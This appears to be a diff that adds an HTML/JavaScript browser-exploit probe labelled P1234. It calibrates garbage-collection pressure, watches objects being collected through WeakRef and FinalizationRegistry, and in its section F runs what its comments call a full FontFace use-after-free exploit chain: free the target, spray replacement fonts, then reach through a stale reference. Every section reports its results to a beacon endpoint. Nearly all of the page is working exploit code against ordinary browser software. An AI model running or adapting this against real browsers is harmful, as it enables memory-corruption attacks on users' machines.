@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1234</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1234-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+
+log('=== P1234: GC FORCE + WEAKREF UAF TIMING ===');
+log('Time: '+new Date().toISOString());
+B('START','P1234-gc-force-weakref-uaf');
+
+// ============================================================
+// A: Test if gc() or any GC-forcing function exists
+// ============================================================
+try {
+  log('\n--- A: GC function availability ---');
+  var gcFuncs = ['gc','GC','collectGarbage','$vm','$','Realm'];
+  var found = [];
+  for(var i=0;i<gcFuncs.length;i++) {
+    try {
+      var fn = eval(gcFuncs[i]);
+      found.push(gcFuncs[i]+'='+typeof fn);
+    } catch(e) {
+      found.push(gcFuncs[i]+'=UNDEF');
+    }
+  }
+  // Also test window.gc
+  try {
+    if(typeof window.gc === 'function') found.push('window.gc=YES');
+    else found.push('window.gc='+typeof window.gc);
+  } catch(e) { found.push('window.gc=ERR'); }
+
+  // Check for JSC-specific internals
+  try {
+    if(typeof $vm !== 'undefined') found.push('$vm.gc='+typeof $vm.gc);
+  } catch(e){}
+  try {
+    if(typeof internals !== 'undefined') found.push('internals=YES');
+  } catch(e) { found.push('internals=NO'); }
+
+  log('GC functions: '+found.join(', '));
+  B('A-gcfunc', found.join('|'));
+} catch(e) {
+  log('A FATAL: '+e.message);
+  B('A-gcfunc', 'FATAL:'+e.message);
+}
+
+// ============================================================
+// B: Calibrate GC pressure — find what it takes to collect
+// a plain object observed via WeakRef
+// ============================================================
+try {
+  log('\n--- B: GC pressure calibration ---');
+
+  var strategies = [
+    // Strategy 1: Many small objects
+    function() {
+      for(var i=0;i<500000;i++) { var t={a:i,b:new Array(4)}; }
+    },
+    // Strategy 2: Large ArrayBuffers (malloc pressure)
+    function() {
+      for(var i=0;i<500;i++) { var t=new ArrayBuffer(1048576); } // 500MB total
+    },
+    // Strategy 3: Many strings (immutable, different GC bucket)
+    function() {
+      var s='';
+      for(var i=0;i<100000;i++) { s='str_'+i+'_'+Math.random().toString(36); }
+    },
+    // Strategy 4: DOM node creation+removal
+    function() {
+      var frag=document.createDocumentFragment();
+      for(var i=0;i<10000;i++){
+        var d=document.createElement('div');
+        d.textContent='node'+i;
+        frag.appendChild(d);
+      }
+      // Don't attach — just let it become garbage
+      frag=null;
+    },
+    // Strategy 5: Typed array churn
+    function() {
+      for(var i=0;i<10000;i++) {
+        var ab=new ArrayBuffer(65536);
+        var v=new Uint8Array(ab);
+        v[0]=i&0xFF;
+      }
+    },
+    // Strategy 6: Closure factory
+    function() {
+      for(var i=0;i<200000;i++) {
+        (function(x){return function(){return x+1};})(i);
+      }
+    },
+    // Strategy 7: RegExp objects
+    function() {
+      for(var i=0;i<100000;i++) {
+        new RegExp('pattern_'+i+'_[a-z]+');
+      }
+    },
+    // Strategy 8: Combined — all at once
+    function() {
+      for(var i=0;i<100000;i++) {
+        var obj={a:i,b:new Array(8)};
+        var ab=new ArrayBuffer(1024);
+        var s='combined_'+i;
+      }
+      for(var i=0;i<200;i++) { new ArrayBuffer(1048576); }
+    }
+  ];
+
+  var stratNames=['500K obj','500x1MB AB','100K str','10K DOM','10K TA','200K closure','100K regex','combined'];
+
+  for(var s=0;s<strategies.length;s++) {
+    var wr = null;
+    (function(){
+      var target = {marker:'gctest_'+s, data:new Array(100)};
+      wr = new WeakRef(target);
+    })();
+
+    var alive1 = wr.deref() ? 'Y' : 'N';
+
+    // Run GC pressure strategy
+    var t0 = Date.now();
+    try {
+      strategies[s]();
+    } catch(e) {
+      log('Strategy '+s+' error: '+e.message);
+    }
+    var elapsed = Date.now() - t0;
+
+    var alive2 = wr.deref() ? 'Y' : 'N';
+    var result = stratNames[s]+': before='+alive1+' after='+alive2+' ('+elapsed+'ms)';
+    log(result);
+
+    if(alive2 === 'N') {
+      log('*** GC COLLECTED with strategy: '+stratNames[s]+' ***');
+    }
+  }
+
+  B('B-calib', 'done');
+} catch(e) {
+  log('B FATAL: '+e.message);
+  B('B-calib', 'FATAL:'+e.message);
+}
+
+// ============================================================
+// C: FontFace-specific GC — can we collect a FontFace?
+// ============================================================
+try {
+  log('\n--- C: FontFace GC collection ---');
+  document.fonts.clear();
+
+  // Use the best GC strategy from B (try all aggressively)
+  function forceGC() {
+    // Combined heavy pressure
+    for(var i=0;i<200000;i++) {
+      var obj={a:i,b:[i,i+1,i+2,i+3]};
+    }
+    for(var i=0;i<300;i++) {
+      new ArrayBuffer(1048576);
+    }
+    for(var i=0;i<5000;i++) {
+      var d=document.createElement('div');
+      d.textContent='gc_'+i;
+    }
+  }
+
+  // Test 1: FontFace never added to document.fonts
+  var wr1 = null;
+  (function(){
+    var fb = new ArrayBuffer(128);
+    var face = new FontFace('GCFace1', fb);
+    wr1 = new WeakRef(face);
+  })();
+  log('C1 before GC: '+(wr1.deref()?'ALIVE':'DEAD'));
+  forceGC();
+  log('C1 after GC: '+(wr1.deref()?'ALIVE':'DEAD'));
+
+  // Test 2: FontFace added then removed from document.fonts
+  var wr2 = null;
+  (function(){
+    var fb = new ArrayBuffer(128);
+    var face = new FontFace('GCFace2', fb);
+    document.fonts.add(face);
+    document.fonts.delete(face);
+    wr2 = new WeakRef(face);
+  })();
+  log('C2 before GC: '+(wr2.deref()?'ALIVE':'DEAD'));
+  forceGC();
+  log('C2 after GC: '+(wr2.deref()?'ALIVE':'DEAD'));
+
+  // Test 3: FontFace cleared via document.fonts.clear()
+  var wr3 = null;
+  (function(){
+    var fb = new ArrayBuffer(128);
+    var face = new FontFace('GCFace3', fb);
+    document.fonts.add(face);
+    document.fonts.clear();
+    wr3 = new WeakRef(face);
+  })();
+  log('C3 before GC: '+(wr3.deref()?'ALIVE':'DEAD'));
+  forceGC();
+  log('C3 after GC: '+(wr3.deref()?'ALIVE':'DEAD'));
+
+  // Test 4: Multiple rounds of GC
+  var wr4 = null;
+  (function(){
+    var fb = new ArrayBuffer(128);
+    var face = new FontFace('GCFace4', fb);
+    wr4 = new WeakRef(face);
+  })();
+  for(var round=0;round<5;round++) {
+    forceGC();
+    if(!wr4.deref()) {
+      log('C4 collected at round '+round+'!');
+      break;
+    }
+  }
+  if(wr4.deref()) log('C4 STILL ALIVE after 5 rounds');
+
+  var summary = 'C1='+(wr1.deref()?'alive':'dead')+
+    '|C2='+(wr2.deref()?'alive':'dead')+
+    '|C3='+(wr3.deref()?'alive':'dead')+
+    '|C4='+(wr4.deref()?'alive':'dead');
+  log('FontFace GC summary: '+summary);
+  B('C-fontgc', summary);
+
+} catch(e) {
+  log('C FATAL: '+e.message);
+  B('C-fontgc', 'FATAL:'+e.message);
+}
+
+// ============================================================
+// D: FinalizationRegistry callback timing
+// Does the callback fire during our synchronous execution?
+// ============================================================
+try {
+  log('\n--- D: FinalizationRegistry callback timing ---');
+
+  var frFired = [];
+  var fr = new FinalizationRegistry(function(heldValue) {
+    frFired.push({time: Date.now(), value: heldValue});
+  });
+
+  // Register several targets
+  (function(){
+    for(var i=0;i<10;i++) {
+      var target = {id: 'fr_target_'+i, data: new Array(1000)};
+      fr.register(target, 'token_'+i);
+    }
+  })();
+
+  log('Registered 10 targets, forcing GC...');
+
+  // Multiple rounds of GC with checks between
+  for(var round=0;round<5;round++) {
+    // Heavy allocation
+    for(var i=0;i<200000;i++) { var t={x:i}; }
+    for(var i=0;i<200;i++) { new ArrayBuffer(1048576); }
+
+    if(frFired.length > 0) {
+      log('FR callback fired at round '+round+'! Count='+frFired.length);
+      break;
+    }
+  }
+
+  if(frFired.length === 0) {
+    log('FR callbacks never fired during sync execution');
+
+    // Try: does sync XHR pump the event loop enough?
+    try {
+      var x = new XMLHttpRequest();
+      x.open('GET', '/beacon.php?tag=P1234-D-pump&data=event_loop_pump&t='+Date.now(), false);
+      x.send(null);
+    } catch(e){}
+
+    // Check again after sync XHR
+    if(frFired.length > 0) {
+      log('FR callback fired AFTER sync XHR! Count='+frFired.length);
+    } else {
+      log('FR callbacks still not fired after sync XHR');
+    }
+  }
+
+  B('D-frcallback', 'fired='+frFired.length+'|rounds=5');
+
+} catch(e) {
+  log('D FATAL: '+e.message);
+  B('D-frcallback', 'FATAL:'+e.message);
+}
+
+// ============================================================
+// E: WeakRef polling pattern — the REAL exploit primitive
+// Can we detect GC of a specific object by polling deref()?
+// ============================================================
+try {
+  log('\n--- E: WeakRef polling for GC detection ---');
+
+  // Create a bunch of objects with WeakRefs, release strong refs
+  var weakRefs = [];
+  (function(){
+    for(var i=0;i<20;i++) {
+      var obj = {id: i, payload: new ArrayBuffer(4096)};
+      weakRefs.push(new WeakRef(obj));
+    }
+  })();
+
+  var aliveCount0 = 0;
+  for(var i=0;i<weakRefs.length;i++) {
+    if(weakRefs[i].deref()) aliveCount0++;
+  }
+  log('Before GC: '+aliveCount0+'/'+weakRefs.length+' alive');
+
+  // Allocate heavily in chunks, checking after each chunk
+  var collectedAt = -1;
+  for(var chunk=0;chunk<20;chunk++) {
+    // Allocation chunk
+    for(var i=0;i<100000;i++) {
+      var t = {chunk:chunk, i:i, arr:[1,2,3,4]};
+    }
+    for(var i=0;i<100;i++) {
+      new ArrayBuffer(524288); // 512KB
+    }
+
+    // Check how many collected
+    var alive = 0;
+    for(var j=0;j<weakRefs.length;j++) {
+      if(weakRefs[j].deref()) alive++;
+    }
+
+    if(alive < aliveCount0 && collectedAt === -1) {
+      collectedAt = chunk;
+      log('First collection at chunk '+chunk+': '+alive+'/'+weakRefs.length+' alive');
+    }
+
+    if(alive === 0) {
+      log('ALL collected at chunk '+chunk);
+      break;
+    }
+  }
+
+  var aliveCountFinal = 0;
+  for(var i=0;i<weakRefs.length;i++) {
+    if(weakRefs[i].deref()) aliveCountFinal++;
+  }
+  log('Final: '+aliveCountFinal+'/'+weakRefs.length+' alive, first_collect_chunk='+collectedAt);
+
+  B('E-wrpoll', 'start='+aliveCount0+'|final='+aliveCountFinal+'|firstChunk='+collectedAt);
+
+} catch(e) {
+  log('E FATAL: '+e.message);
+  B('E-wrpoll', 'FATAL:'+e.message);
+}
+
+// ============================================================
+// F: FontFace UAF pattern — the full exploit chain attempt
+// 1. Create target FontFace → WeakRef
+// 2. Remove all refs, force GC until WeakRef dead
+// 3. Spray replacement objects
+// 4. Access through stale reference
+// ============================================================
+try {
+  log('\n--- F: FontFace UAF exploit pattern ---');
+  document.fonts.clear();
+
+  // Step 1: Create target with FinalizationRegistry + WeakRef
+  var uafFired = false;
+  var uafFR = new FinalizationRegistry(function(val) {
+    uafFired = true;
+  });
+
+  var targetWR = null;
+  var staleDiv = document.createElement('div');
+  staleDiv.style.fontFamily = '"UAFFont", monospace';
+  staleDiv.style.fontSize = '72px';
+  staleDiv.textContent = 'ABCDEFGHIJ';
+  document.body.appendChild(staleDiv);
+
+  // Measure baseline
+  var baseWidth = staleDiv.offsetWidth;
+  log('Baseline width: '+baseWidth);
+
+  // Create the target FontFace and use it
+  var targetFace = null;
+  (function(){
+    var fb = new ArrayBuffer(256);
+    // Write a minimal-ish font header
+    var v = new Uint8Array(fb);
+    v[0]=0;v[1]=1;v[2]=0;v[3]=0; // TrueType
+    v[4]=0;v[5]=1;v[6]=0;v[7]=16;v[8]=0;v[9]=0;v[10]=0;v[11]=16;
+
+    targetFace = new FontFace('UAFFont', fb);
+    document.fonts.add(targetFace);
+    targetWR = new WeakRef(targetFace);
+    uafFR.register(targetFace, 'uaf-token');
+  })();
+
+  log('Target face status: '+targetFace.status);
+  log('fonts.size: '+document.fonts.size);
+
+  // Step 2: Measure with font "registered"
+  var withFontWidth = staleDiv.offsetWidth;
+  log('With font width: '+withFontWidth);
+
+  // Step 3: Remove from document.fonts and release strong ref
+  document.fonts.delete(targetFace);
+  targetFace = null;
+
+  log('After delete: fonts.size='+document.fonts.size+', weakref='+(targetWR.deref()?'alive':'dead'));
+
+  // Step 4: GC pressure to free the FontFace
+  var gcRounds = 0;
+  var collected = false;
+  for(var round=0;round<30;round++) {
+    gcRounds++;
+    // Massive allocation pressure
+    for(var i=0;i<150000;i++) {
+      var t = {r:round, i:i, d:[1,2,3]};
+    }
+    for(var i=0;i<150;i++) {
+      new ArrayBuffer(1048576);
+    }
+
+    if(!targetWR.deref()) {
+      collected = true;
+      log('*** TARGET COLLECTED at round '+round+'! ***');
+
+      // Step 5: Immediately spray replacement FontFaces
+      var sprayFaces = [];
+      for(var j=0;j<50;j++) {
+        var sb = new ArrayBuffer(256);
+        var sv = new Uint8Array(sb);
+        // Fill with distinctive pattern
+        for(var k=0;k<256;k++) sv[k] = 0x41 + (j & 0xF);
+        try {
+          var sf = new FontFace('Spray'+j, sb);
+          document.fonts.add(sf);
+          sprayFaces.push(sf);
+        } catch(e){}
+      }
+      log('Sprayed '+sprayFaces.length+' replacement faces');
+
+      // Step 6: Check layout with stale font reference
+      var afterWidth = staleDiv.offsetWidth;
+      log('After spray width: '+afterWidth+' (base was '+baseWidth+')');
+
+      // Check if any font was "loaded" by the spray
+      log('fonts.size after spray: '+document.fonts.size);
+
+      break;
+    }
+  }
+
+  if(!collected) {
+    log('FontFace NOT collected after '+gcRounds+' rounds');
+    log('WeakRef status: '+(targetWR.deref()?'alive':'dead'));
+    log('FR callback fired: '+uafFired);
+  }
+
+  // Measure final state
+  var finalWidth = staleDiv.offsetWidth;
+  log('Final width: '+finalWidth);
+  document.body.removeChild(staleDiv);
+
+  B('F-uaf', 'collected='+collected+'|rounds='+gcRounds+'|base='+baseWidth+'|final='+finalWidth+'|fr='+uafFired);
+
+} catch(e) {
+  log('F FATAL: '+e.message);
+  B('F-uaf', 'FATAL:'+e.message);
+}
+
+// ============================================================
+// G: Alternative GC trigger — Worker-based allocation
+// Worker allocates heavily, which may trigger main-thread GC
+// ============================================================
+try {
+  log('\n--- G: Worker-assisted GC ---');
+
+  var workerGC = 'onmessage=function(e){' +
+    'var big=[];' +
+    'for(var i=0;i<2000;i++){' +
+      'big.push(new ArrayBuffer(65536));' +
+    '}' +
+    'big=null;' +
+    'for(var i=0;i<500000;i++){var t={x:i};}' +
+    'try{' +
+      'var x=new XMLHttpRequest();' +
+      'x.open("GET","/beacon.php?tag=P1234-G-worker&data=gc_done&t="+Date.now(),false);' +
+      'x.send(null);' +
+    '}catch(ex){}' +
+    'postMessage("done");' +
+  '};';
+
+  var blob = new Blob([workerGC],{type:'application/javascript'});
+  var wurl = URL.createObjectURL(blob);
+  var w = new Worker(wurl);
+
+  // Create target objects
+  var gRefs = [];
+  (function(){
+    for(var i=0;i<10;i++) {
+      var obj = {id:'wgc_'+i, buf:new ArrayBuffer(4096)};
+      gRefs.push(new WeakRef(obj));
+    }
+  })();
+
+  var gAlive0 = 0;
+  for(var i=0;i<gRefs.length;i++) if(gRefs[i].deref()) gAlive0++;
+
+  // Tell worker to allocate
+  w.postMessage('go');
+
+  // While worker runs, do our own GC pressure on main thread
+  for(var i=0;i<300000;i++) { var t={x:i}; }
+  for(var i=0;i<500;i++) { new ArrayBuffer(524288); }
+
+  var gAlive1 = 0;
+  for(var i=0;i<gRefs.length;i++) if(gRefs[i].deref()) gAlive1++;
+
+  log('Worker GC: before='+gAlive0+' after='+gAlive1);
+
+  w.terminate();
+  URL.revokeObjectURL(wurl);
+
+  B('G-workergc', 'before='+gAlive0+'|after='+gAlive1);
+
+} catch(e) {
+  log('G FATAL: '+e.message);
+  B('G-workergc', 'FATAL:'+e.message);
+}
+
+// ============================================================
+// H: Full-page GC nuke — allocate until OOM, then check
+// ============================================================
+try {
+  log('\n--- H: OOM GC trigger ---');
+
+  var hRefs = [];
+  (function(){
+    for(var i=0;i<10;i++) {
+      var obj = {id:'oom_'+i, big:new Array(1000)};
+      hRefs.push(new WeakRef(obj));
+    }
+  })();
+
+  var hAlive0 = 0;
+  for(var i=0;i<hRefs.length;i++) if(hRefs[i].deref()) hAlive0++;
+
+  // Allocate until we see collection or hit a reasonable limit
+  var totalMB = 0;
+  var hCollected = false;
+  try {
+    for(var round=0;round<50;round++) {
+      // 50MB per round
+      for(var i=0;i<50;i++) {
+        new ArrayBuffer(1048576);
+        totalMB++;
+      }
+
+      var alive = 0;
+      for(var j=0;j<hRefs.length;j++) if(hRefs[j].deref()) alive++;
+
+      if(alive < hAlive0) {
+        log('H: Collection after ~'+totalMB+'MB! alive='+alive+'/'+hRefs.length);
+        hCollected = true;
+        break;
+      }
+    }
+  } catch(e) {
+    log('H: OOM at ~'+totalMB+'MB: '+e.message);
+    // Check after OOM
+    var alive = 0;
+    for(var j=0;j<hRefs.length;j++) if(hRefs[j].deref()) alive++;
+    if(alive < hAlive0) {
+      log('H: Collected after OOM! alive='+alive);
+      hCollected = true;
+    }
+  }
+
+  if(!hCollected) {
+    var hAlive1 = 0;
+    for(var i=0;i<hRefs.length;i++) if(hRefs[i].deref()) hAlive1++;
+    log('H: NOT collected after '+totalMB+'MB, alive='+hAlive1);
+  }
+
+  B('H-oom', 'collected='+hCollected+'|totalMB='+totalMB);
+
+} catch(e) {
+  log('H FATAL: '+e.message);
+  B('H-oom', 'FATAL:'+e.message);
+}
+
+// ============================================================
+// DONE
+// ============================================================
+log('\n=== P1234 COMPLETE ===');
+B('DONE','all');
+
+</script>
+</body>
+</html>
